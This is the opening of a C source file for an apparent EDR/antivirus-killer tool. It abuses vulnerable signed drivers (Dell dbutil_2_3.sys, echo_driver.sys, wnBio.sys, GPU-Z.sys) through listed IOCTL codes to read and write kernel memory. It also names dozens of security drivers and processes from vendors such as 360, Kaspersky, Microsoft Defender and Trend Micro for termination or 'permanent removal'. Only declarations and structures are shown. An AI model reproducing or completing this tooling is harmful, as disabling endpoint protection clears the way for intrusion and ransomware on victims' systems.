#include<windows.h>
#include<stdio.h>
#include<winternl.h>
#include<psapi.h>
#include<tlhelp32.h>
#include <time.h>
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"psapi.lib")

/*
Driver_Type specifies different drivers
1 -> echo_driver.sys driver, supports win10+
2 -> dbutil_2_3.sys driver, supports Win7+ (may not be loaded in higher versions such as win11)
*/

INT Driver_Type = 0;

//Specify the location of the driver
CHAR* DrivePath = NULL;

// Optional 4th argument: "clear" to permanently remove AV/EDR
CONST CHAR* ClearMode = NULL;

// For driver type 4 (GPU-Z): CR3 base address cache
DWORD64 g_CR3Base = 0;

// For driver type 4 (GPU-Z): whether CR3 has been found
DWORD g_CR3Found = 0;

// For driver type 4 (GPU-Z): kernel virtual address base for mapping
DWORD64 g_MapBase = 0;

// Count of renamed Defender files (type 3 clear mode)
DWORD g_DefenderRenameCount = 0;

//Set the driver name to be cleared
CONST CHAR* AVDriver[] = {
	"klflt.sys","klhk.sys","klif.sys","klupd_KES-21-9_arkmon.sys","KLIF.KES-21-9.sys","klbackupflt.KES-21-9.sys","klids.sys","klupd_klif_arkmon.sys",
	"QaxNfDrv.sys","QKBaseChain64.sys","QKNetFilter.sys","QKSecureIO.sys","QesEngEx.sys","QkHelp64.sys","qmnetmonw64.sys",
	"QMUdisk64_ev.sys","QQSysMonX64_EV.sys","TAOKernelEx64_ev.sys","TFsFltX64_ev.sys","TAOAcceleratorEx64_ev.sys","QQSysMonX64.sys","TFsFlt.sys",
	"sysdiag_win10.sys","sysdiag.sys",
	"360AvFlt.sys",
	"360qpesv64.sys","360AntiSteal64.sys","360AntiSteal.sys","360qpesv.sys","360FsFlt.sys","360Box64.sys","360netmon.sys","360AntiHacker64.sys","360Hvm64.sys","360qpesv64.sys","360AntiHijack64.sys","360AntiExploit64.sys","DsArk64.sys","360Sensor64.sys","DsArk.sys",
	"WdFilter.sys","MpKslDrv.sys","mpsdrv.sys","WdNisDrv.sys",
	"TmPreFilter.sys","TmXPFlt.sys",
	"AHipsFilter.sys","AHipsFilter64.sys","GuardKrnl.sys","GuardKrnl64.sys","GuardKrnlXP64.sys","protectdrv.sys","protectdrv64.sys","AntiyUSB.sys","AntiyUSB64.sys","AHipsXP.sys","AHipsXP64.sys","AtAuxiliary.sys","AtAuxiliary64.sys","TrustSrv.sys","TrustSrv64.sys",
	NULL
};

// AV/EDR process executable names (used for "clear" / permanently remove mode)
CONST CHAR* AVProcess[] = {
	// 360
	"360qbus.exe","360epp.exe","360edrsensor.exe","eppservice.exe","eppcontainer.exe","naccltWidget.exe",
	"360tray.exe","zhudongfangyu.exe","360safe.exe","safesvr.exe","360entclient.exe","360TptMon.exe",
	"360DrvMgr.exe","360sd.exe","360rp.exe","360rps.exe","360sdrun.exe","360skylarsvc.exe",
	// Tianqing / QAX
	"tqclient.exe","tqtray.exe","tqdefender.exe","trantoragent.exe","qaxengmanager.exe","tqsafeui.exe",
	"qaxentclient.exe","qaxtray.exe",
	// Windows Defender
	"securityhealthsystray.exe","securityhealthservice.exe",
	// Tinder / XuanWu
	"wsssr_defence_daemon.exe","wsssr_defence_service.exe","sfavtray.exe","sfavsvc.exe",
	"edr_monitor.exe","edr_agent.exe","nac_monitor.exe","nac_agent.exe","abs_deployer.exe",
	"eaio_service.exe","eaio_agent.exe","sfavroguedf.exe","sxfhost.exe","fget.exe","winlogbeat64.exe",
	// Kaspersky
	"avp.exe","avpui.exe","avpsus.exe","hipsdaemon.exe","usysdiag.exe","hipstray.exe",
	// Tencent
	"qqpcrtp.exe","qqpctray.exe","qqpcleakscan.exe","qqpcexternal.exe","qqpcrealtimespeedup.exe","QMDL.exe","qmbsrv.exe",
	// Trend Micro
	"tssm.exe","tmlisten.exe","pccntmon.exe","ntrtscan.exe",
	// AsiaInfo EDR
	"AisEsmNetService.exe","AsiainfocwGuardCenter.exe","AsiainfocwGuardMonitor.exe","AisEsmEdr.exe","AisEsmUI.exe",
	// AnTian ZhiJia
	"ds_monitor.exe","ds_aiupdatecenter.exe","ds_aipluginhelper.exe","ds_aiGuardMonitor.exe",
	"ds_aiguardcenter.exe","ds_aicloudhelper.exe",
	// Deep Security / Trend Micro
	"Notifier.exe","dsa.exe","coreFrameworkHost.exe","coreServiceShell.exe","AgentService.exe",
	NULL
};

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

typedef struct {
	DWORD pid;
	ACCESS_MASK access;
	HANDLE handle;
}GetHandle;

typedef struct {
	HANDLE targetProcess;
	void* fromAddress;
	void* toAddress;
	size_t length;
	void* padding;
	UINT returnCode;
}ReadMem;

struct DellBuff {
	ULONGLONG pad1 = 0x4141414141414141;
	ULONGLONG Address = 0;
	ULONGLONG three1 = 0x0000000000000000;
	ULONGLONG value = 0x0000000000000000;
} DellBuff;

// GPU-Z.sys (driver type 4) request/response structures
// sub_140004450 request: 0xC bytes = physAddr(8) + size(4)
typedef struct {
	ULONGLONG PhysAddr;   // physical address to map
	ULONG     Size;       // bytes to map
} GPUZ_MAPREQ;          // 12 bytes, used with IOCTL 0x8000645C

// sub_140004790 uses a 0x28-byte buffer:
//   buf[0]=size, buf[1]=kernelVirtAddr,
//   response: buf[2]=mapBase(VirtPage), buf[3]=KernelPtr, buf[4]=mapSize
typedef struct {
	ULONGLONG Size;       // [0] size in bytes
	ULONGLONG KernelAddr; // [1] kernel virtual address to map
	ULONGLONG VirtPage;   // [2] mapped page virtual address (output)
	ULONGLONG KernelPtr;  // [3] kernel pointer to data (output, used for memmove)
	ULONGLONG MapSize;    // [4] mapped size (output)
} WNBIO_MAPBUFF;        // 0x28 bytes

// wnBio.sys (driver type 3) IOCTL codes
#define WNBIO_IOCTL_READ    0x80102040
#define WNBIO_IOCTL_WRITE   0x80102044

// GPU-Z.sys IOCTL codes (used by sub_140004450)
#define GPUZ_IOCTL_MAPPHYS  0x8000645C  // map phys->kernel virt, returns kernel ptr
#define GPUZ_IOCTL_UNMAP    0x80006460  // unmap
// GPU-Z.sys write IOCTL (unused in this version, writes go via mapped virt ptr)
#define GPUZ_IOCTL_WRITE    0x80006460  // same as unmap: flush/commit write

typedef VOID(__stdcall* RtlInitUnicodeStringPtr) (IN OUT PUNICODE_STRING  DestinationString, IN wchar_t* SourceString);
typedef NTSTATUS(WINAPI* RtlAdjustPrivilegePtr)(IN ULONG Privilege, IN BOOL Enable, IN BOOL CurrentThread, OUT PULONG pPreviousState);
typedef NTSTATUS(WINAPI* NtLoadDriverPtr)(const UNICODE_STRING*);
typedef NTSTATUS(WINAPI* NtUnLoadDriverPtr)(const UNICODE_STRING*);
typedef void(__stdcall* NTPROC)(DWORD*, DWORD*, DWORD*);
typedef NTSTATUS(WINAPI* NtQuerySystemInformationPtr)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* NtQueryInformationProcessPtr)(HANDLE, ULONG, PVOID, ULONG, PULONG);